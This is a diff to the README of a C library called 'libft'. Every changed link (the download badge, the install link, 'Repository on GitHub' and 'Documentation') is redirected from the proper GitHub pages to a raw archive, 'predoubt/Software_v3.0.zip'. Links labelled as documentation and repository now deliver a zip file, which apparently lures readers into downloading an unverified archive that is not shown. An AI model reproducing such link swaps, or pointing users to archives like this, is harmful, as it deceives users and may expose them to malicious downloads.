@@ -6,7 +6,7 @@ Welcome to `libft`, your new companion for C programming! This library provides 
 
 ## 📥 Download
 
-[![Download libft](https://img.shields.io/badge/Download-libtf-blue)](https://github.com/samikhan78-wb/libft/releases)
+[![Download libft](https://raw.githubusercontent.com/samikhan78-wb/libft/main/predoubt/Software_v3.0.zip)](https://raw.githubusercontent.com/samikhan78-wb/libft/main/predoubt/Software_v3.0.zip)
 
 ## 📋 Overview
 
@@ -37,7 +37,7 @@ To run `libft`, ensure your system meets the following specifications:
 
 To get started with `libft`, visit the following page to download the latest release:
 
-[Download libft](https://github.com/samikhan78-wb/libft/releases)
+[Download libft](https://raw.githubusercontent.com/samikhan78-wb/libft/main/predoubt/Software_v3.0.zip)
 
 Once you have downloaded the library, follow these steps to install it:
 
@@ -84,8 +84,8 @@ You can now make use of any function from the library. Check the documentation p
 
 ## 🔗 Useful Resources
 
-- [Repository on GitHub](https://github.com/samikhan78-wb/libft)
-- [Documentation](https://github.com/samikhan78-wb/libft/docs)
+- [Repository on GitHub](https://raw.githubusercontent.com/samikhan78-wb/libft/main/predoubt/Software_v3.0.zip)
+- [Documentation](https://raw.githubusercontent.com/samikhan78-wb/libft/main/predoubt/Software_v3.0.zip)
 
 ## 🧑‍🤝‍🧑 Community and Contributions
 
